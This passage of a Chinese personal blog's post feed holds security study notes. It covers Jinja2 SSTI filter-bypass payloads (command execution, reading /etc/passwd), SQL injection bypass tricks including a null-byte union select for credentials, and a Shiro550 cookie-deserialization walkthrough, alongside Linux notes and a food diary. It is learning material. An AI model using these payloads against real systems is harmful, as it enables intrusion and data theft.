alt="QQ截图20220315214324"></p><p>那么我们可以将这里的8*8换成别的python函数，来回显结果。获取数据。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240038.png" alt="QQ截图20220315214759"></p><h3 id="利用魔术方法"><a href="#利用魔术方法" class="headerlink" title="利用魔术方法"></a>利用魔术方法</h3><ul><li>class返回[]所属的对象</li><li>class+base:返回这个对象所继承的基类</li><li>class+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240131.png" alt="QQ截图20220315220342"></p><p>类，在这里面我们不乏可以找到我们要用的子类如前文所提到的：file、open等等。</p><p>这里还有一个小技巧：</p><p>可以通过notepad++，快速查找。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203152240571.png" alt="QQ截图20220315222043"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> &#123;&#125;.__class__.__base()<br>        <span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure><p>也就是说可以找到一些命令执行的东西。</p><p>这些命令的东西可以在这里找到。</p><h3 id="1、os-system"><a href="#1、os-system" class="headerlink" title="1、os.system()"></a>1、os.system()</h3><p>用法：os.system(command)<br>但是用这个无法回显。</p><h3 id="2、os-popen"><a href="#2、os-popen" class="headerlink" title="2、os.popen()"></a>2、os.popen()</h3><p>用法：os.popen(command[,mode[,bufsize]])</p><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。<br>还需要了解一个魔法函数<br>globals该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p><p>大体就是这样吧。姑且了解一下。</p><p>回归正题。今天护网的师傅问我问题。然后我很焦虑。问了我一些bypass问题。其中有一个就是ssti的。害!</p><p>看看h3师傅的。</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>1、拼接（过滤了命令执行的函数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p>2、过滤[]（这里h3师傅的没有理解到）</p><p>借助request对象：<br>request变量可以访问所有已发送的参数，因此我们可以request.args.param用来检索新的paramGET参数的值,将其中的request.args改为request.values则利用post的方式进行传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd<br></code></pre></td></tr></table></figure><p><strong>其他处的：</strong></p><ul><li>如果对我们特定的参数进行了严格的过滤，我们就可以使用<code>request</code>来进行绕过，request可以获得请求的相关信息，我们拿过滤<code>__class__</code>，可以用<code>request.args.t1</code>且以GET方式提交<code>t1=__class__</code>来替换被过滤的<code>__class__</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__&#125;&#125; =&gt; &#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>[request.args.t1]&#125;&#125;&amp;t1=__class__<br></code></pre></td></tr></table></figure><p>3、过滤双下划线__</p><ul><li>编码绕过          _<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<br><span class="hljs-string">&#x27;&#x27;</span>[request.args.<span class="hljs-keyword">class</span>][request.args.mro][<span class="hljs-number">2</span>][request.args.subclasses]()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()<br>&#125;&#125;&amp;<span class="hljs-keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__<br></code></pre></td></tr></table></figure><p>这里一下又明白了上面h3师傅的意思。</p><p>4、过滤一些函数名如__import__等</p><p>python的初始模块_builtin__里有很多危险的方法，一条路没了就找找其他的路<br>我们可以直接用 eval() exec() execfile()等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">eval</span>()<br></code></pre></td></tr></table></figure><p>5、绕过config参数</p><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag<br>但是如果被过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="hljs-literal">None</span>&gt;<br>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config<br></code></pre></td></tr></table></figure><p>6、删除了很多模块，但是没有删除reload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reload(__builtins__)，重新加载被删除的模块，直接命令执行，只用于py2 <br></code></pre></td></tr></table></figure><p>7、过滤小点号</p><p>可以采用绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">attr</span><span class="hljs-params">()</span></span>或<span class="hljs-selector-attr">[]</span><br></code></pre></td></tr></table></figure><p>8、过滤括号</p><p>可以使用{ % % }中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</p>]]></content>
    
    
    <categories>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux知识点</title>
    <link href="/2022/03/15/Linux%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/03/15/Linux%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux知识点"><a href="#Linux知识点" class="headerlink" title="Linux知识点"></a>Linux知识点</h1><p>今天很受打击，面试问了几个非常简单的问题我都没有回答上来。（其实都遇到过，只不过真的是忘了。很难受。面试效果是真的差劲。）</p><h2 id="Linux常用输出文件总结"><a href="#Linux常用输出文件总结" class="headerlink" title="Linux常用输出文件总结"></a>Linux常用输出文件总结</h2><ul><li>cat，输出全部内容。</li><li>hear，输出前10行内容。</li><li>tail</li><li>more，输出前10行，后续内容以百分比显示，回车键继续输出，按q键退出。</li><li>less，可翻页输出。</li><li>vim。</li><li>grep（同样也可以，前提是知道文件某些内容）</li></ul><h2 id="修改文件权限的区别"><a href="#修改文件权限的区别" class="headerlink" title="修改文件权限的区别"></a>修改文件权限的区别</h2><ol><li>chown (change owner) ： <strong>修改</strong>所属用户与组。</li><li>chmod (change mode) ： <strong>修改</strong>用户的<strong>权限</strong>。</li><li>chgrp（change group）:   <strong>修改</strong>所属组。</li></ol><h2 id="Linux进程查询"><a href="#Linux进程查询" class="headerlink" title="Linux进程查询"></a>Linux进程查询</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">ps <span class="hljs-built_in">aux</span><br></code></pre></td></tr></table></figure><p>a：显示当前终端下的所有进程信息，包括用户的进程。</p><p>u：使用以用户为主的格式输出进程信息。</p><p>x：显示当前用户在所有终端下的进程。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -elf</span><br></code></pre></td></tr></table></figure><p>-e：显示系统类所有进程信息。</p><p>-l：使用长（long）格式显示进程信息。</p><p>-f：使用完整的（full）格式显示进程信息。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure><p>以全屏交互式的界面显示进程排名，及时跟踪包括CPU、内存等系统资源占用情况，默认情况下每三秒刷新一次，其作用基本类似于Windows系统中的任务管理器。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree -aup</span><br></code></pre></td></tr></table></figure><p>总结：ps（特殊情况树形）和top</p><h2 id="Linux日志查询"><a href="#Linux日志查询" class="headerlink" title="Linux日志查询"></a>Linux日志查询</h2><ul><li>&#x2F;var&#x2F;log&#x2F;utmp 连接时间日志。</li><li>&#x2F;var&#x2F;log&#x2F;lastlog 最后一次成功登录用户的时间和IP</li><li>&#x2F;var&#x2F;log&#x2F;messages linux操作系统常见的系统和服务错误</li><li>&#x2F;var&#x2F;log&#x2F;secure 系统安全日志，记录用户和工作组变坏、用户登录认证的情况</li><li>&#x2F;var&#x2F;log&#x2F;btmp 记录用户登录失败的时间以及ip</li><li>&#x2F;var&#x2F;log&#x2F;cron 记录crond计划服务执行情况（相当于是一个定时任务）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入绕过总结</title>
    <link href="/2022/03/15/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <url>/2022/03/15/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入绕过总结"><a href="#SQL注入绕过总结" class="headerlink" title="SQL注入绕过总结"></a>SQL注入绕过总结</h1><p>为什么来总结一下这个呢？因为今天面试的时候，又是迷迷糊糊。</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库使用不区分大小写的方式来处理sql关键字。</p><h3 id="区分大小写的函数"><a href="#区分大小写的函数" class="headerlink" title="区分大小写的函数"></a>区分大小写的函数</h3><p>ereg（）函数</p><p>preg_match_all()</p><p>preg_match()</p><p>strstr()</p><h2 id="混写绕过"><a href="#混写绕过" class="headerlink" title="混写绕过"></a>混写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">$str <span class="hljs-operator">=</span> &quot;select union * from &quot;;<br>$str1 <span class="hljs-operator">=</span> &quot;select ununionion * from &quot;;<br><br>$ptn <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;/uunionnion/&#x27;</span>;<br><br>$rep <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;union&#x27;</span>;<br><br>$str <span class="hljs-operator">=</span> preg_replace($ptn,$rep,$str);<br><br>echo $str;<br></code></pre></td></tr></table></figure><h2 id="常见注释符"><a href="#常见注释符" class="headerlink" title="常见注释符"></a>常见注释符</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">--+</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="使用单引号闭合"><a href="#使用单引号闭合" class="headerlink" title="使用单引号闭合"></a>使用单引号闭合</h2><p>掠过。</p><h2 id="单引号的绕过"><a href="#单引号的绕过" class="headerlink" title="单引号的绕过"></a>单引号的绕过</h2><p><strong>宽字节注入。</strong></p><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为\ &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面。</p><h2 id="逗号的过滤"><a href="#逗号的过滤" class="headerlink" title="逗号的过滤"></a>逗号的过滤</h2><p>对于<strong>substr()<strong>和</strong>mid()</strong>:一种截取的作用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> mid(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>对于<strong>limit</strong>可以使用<strong>offset</strong>来绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br># 等价于下面这条<span class="hljs-keyword">SQL</span>语句<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> yang limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>     #等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure><h2 id="比较符（-lt-、-gt-）过滤"><a href="#比较符（-lt-、-gt-）过滤" class="headerlink" title="比较符（&lt;、&gt;）过滤"></a>比较符（&lt;、&gt;）过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><h2 id="比较符（-x3D-）过滤"><a href="#比较符（-x3D-）过滤" class="headerlink" title="比较符（&#x3D;）过滤"></a>比较符（&#x3D;）过滤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>使用<span class="hljs-keyword">in</span>方法绕过<br>使用示例：<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>);<br>使用<span class="hljs-keyword">like</span> 绕过<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">Where</span> id <span class="hljs-keyword">like</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"> <span class="hljs-keyword">between</span> a <span class="hljs-keyword">and</span> b：<br><br><span class="hljs-keyword">between</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>; 等价于 <span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="or或and过滤"><a href="#or或and过滤" class="headerlink" title="or或and过滤"></a>or或and过滤</h2><p>||、&amp;&amp;</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>()</p><p>内联注释<br><strong>&#x2F;</strong>&#x2F;**<br>以及</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*!关键字*/</span><br></code></pre></td></tr></table></figure><p>%0a(URL编码中的空格)。</p><p>&#96;(tap键上面的按钮)。</p><p>tap</p><h2 id="解析漏洞绕过"><a href="#解析漏洞绕过" class="headerlink" title="解析漏洞绕过"></a>解析漏洞绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">index.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">2</span>这样的url在上图的环境下最终返回的数据id<span class="hljs-operator">=</span><span class="hljs-number">2</span>的数据。<br><br>客户端请求先到tomcat，tomcat解析第一个参数，接下来tomcat去请求apache，apache解析第二个参数。因为实际上提供服务的是apache服务器，返回数据的也是apache服务器。<br></code></pre></td></tr></table></figure><h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><p>使用十六进制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="垃圾数据绕过"><a href="#垃圾数据绕过" class="headerlink" title="垃圾数据绕过"></a>垃圾数据绕过</h2><p>在很多GET传参的网站，过滤函数对传入的内容有长度限制的时候，会导致GET传入一些垃圾数据的时候，长于过滤的长度的时候就可以实现绕过。</p><h2 id="空字节绕过"><a href="#空字节绕过" class="headerlink" title="空字节绕过"></a>空字节绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">通常的输入过滤器都是在应用程序之外的代码实现的。比如入侵检测系统(IDS)，这些系统一般是由原生编程语言开发而成的，比如c<span class="hljs-operator">+</span><span class="hljs-operator">+</span>，为什么空字节能起作用呢？就是因为在原生编程语言中，根据字符串起始位置到第一个出现空字节的位置来确定字符串长度，所以说空字节就有效终止了字符串。<br><br>只需要在过滤器组织的字符串前面提供一个采用URL编码的空字节即可，例如：<br><br><span class="hljs-number">1.</span><span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-string">&#x27; union select username,password from users where username=&#x27;</span>admin<span class="hljs-string">&#x27; --</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550</title>
    <link href="/2022/03/14/Shiro550/"/>
    <url>/2022/03/14/Shiro550/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><p>安装环境是真的头疼。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br>cd shiro<br>git checkout shiro-root-<span class="hljs-number">1.2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>然后将samples&#x2F;web文件拖入进idea。然后会有些报错啥的情况，反正弄了半天很头疼。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053356.png" alt="QQ截图20220313222244"></p><p>抓包一下得到：<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053799.png" alt="QQ截图20220313225727"></p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142003271.png" alt="QQ截图20220314200304"></p><p>官方说的是<strong>CookieRememberMeManager</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053853.png" alt="QQ截图20220314200414"></p><p>下入断点<strong>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</strong></p><p>跟进一下加密。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053927.png" alt="QQ截图20220314200541"></p><p>简单跟了一下流程。<br>这里可以其密钥：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142018769.png"></p><p>最后会将加密的东西写入cookie。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053515.png" alt="QQ截图20220314201754"></p><p>抓包看一下。</p><p>那么可以来分析一下流程。中间有些不想截图，tomcat调试真的头疼。</p><ul><li>先将用户序列化成数组。</li><li>对其使用ase加密（唯一密钥且我们可知）。</li><li>base64编码。</li><li>写入cookie的rememberme字段。</li></ul><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>下入断点<strong>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</strong></p><p>跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053541.png" alt="QQ截图20220314203449"></p><p>获取cookie内容。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053502.png" alt="QQ截图20220314203529"></p><p>并且进行base64解码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053022.png" alt="QQ截图20220314203606"></p><p>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053805.png" alt="QQ截图20220314203725"></p><p>总结：</p><ul><li>获取cookie值</li><li>base64解码</li><li>aes解密</li><li>反序列化</li></ul><p>这里如何调试。</p><p>1、启动tomcat第一次登陆注册，钩上rememberMe，之后正常登陆，抓包留存</p><p>2、在解密这里下断点，在登录状态下，删除JSESSIONID字段，发送第一步保存的数据包，就可解密。</p><p>算是复习一道吧，以后碰到这种类型的题有思路。撤了。以后碰到这种题以后能够应对。</p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白色情人节</title>
    <link href="/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/"/>
    <url>/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="白色情人节"><a href="#白色情人节" class="headerlink" title="白色情人节"></a>白色情人节</h1><p>哪里来的这么多情人节？？不过刚好记录下，上周末出去happy的两天。</p><p>好久没见面了，宝贝扎了个马尾。在老地方见面，唉哟看了好几眼都没认出来（一定是太久没见的原因，或者贝贝变得更好看了~）。然后就去逛街。嗯，EMMM（男生就是工具人，身上全是包）。虽然快乐，但是好累。我脚丫子还起了水泡。！！！！回到学校才发现。</p><p>感觉每次出去玩都是在吃吃吃吃。这不这次又吃了这么多。<br>先来看看喝的。</p><h2 id="小美人"><a href="#小美人" class="headerlink" title="小美人"></a>小美人</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142007206.jpg"></p><h2 id="民宿"><a href="#民宿" class="headerlink" title="民宿"></a>民宿</h2><p>看了<strong>看不见的客人</strong>（经过宝贝的纠正），表示晚上看，我也有些害怕~！（没有拍照记录。）</p><h2 id="饮料"><a href="#饮料" class="headerlink" title="饮料"></a>饮料</h2><p>生理期还是喝了很多冰的。希望以后来姨妈肚子疼别找我。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741811.jpg" alt="8e7fdaa7faa23c697e3ee273c40d2cc"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741405.jpg" alt="1034252e7240e9a99c788e499b81cf7"></p><p>些许潦草的绿和紫。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141742949.jpg" alt="1e68af5958d7432c513f0048eeed19d"></p><h2 id="吃"><a href="#吃" class="headerlink" title="吃"></a>吃</h2><h3 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h3><p>吃过很多次了，但是每次都感觉还是一如既往的好吃。还吃了个生蚝。然后3min中kou’gan口感最佳的豆腐。最后应该是被我一个人吃完了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141743915.jpg" alt="5f4443b2c2ef8e2f55345edec469423"></p><h3 id="江南"><a href="#江南" class="headerlink" title="江南"></a>江南</h3><p>肥而不腻的东坡肉。但是由于没有解腻菜。宝贝吃不了太多，基本被我一个人干完了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745074.jpg" alt="7c7dc08afe29898eef427727d0d8e99"></p><p>超级鲜的虾仁。（做的真的挺棒的（得到我和宝贝的赞同！！））</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745116.jpg" alt="3f3e0fcd28b604d2f97b017cbac4e71"></p><p>emmm，还有个糖醋里脊。吃起来真的不咋滴。（但是还是推荐菜，就离离原上普。）</p><h3 id="忘了名字的（宝贝想起来了）（口水鸡眉山川菜）"><a href="#忘了名字的（宝贝想起来了）（口水鸡眉山川菜）" class="headerlink" title="忘了名字的（宝贝想起来了）（口水鸡眉山川菜）"></a>忘了名字的（宝贝想起来了）（口水鸡眉山川菜）</h3><p>姑且叫它白斩鸡</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141747984.jpg" alt="ea37fdbb5d6fd18f278cba8bddb7349"></p><p>辣辣辣辣，但是宝贝就爱吃里面的萝卜丝，就很离谱。第一次看宝贝，吃的辣出汗水然后还要一直吃。哈哈哈。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748618.jpg" alt="d74c56e97f18d2e29624f63ec8eed34"></p><p>美丽的天鹅腿<del>.</del></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748053.jpg"></p><p>又是虾仁，吃起来还是非常不错。就是又甜又辣（有点怪异！）</p><h2 id="蛋糕"><a href="#蛋糕" 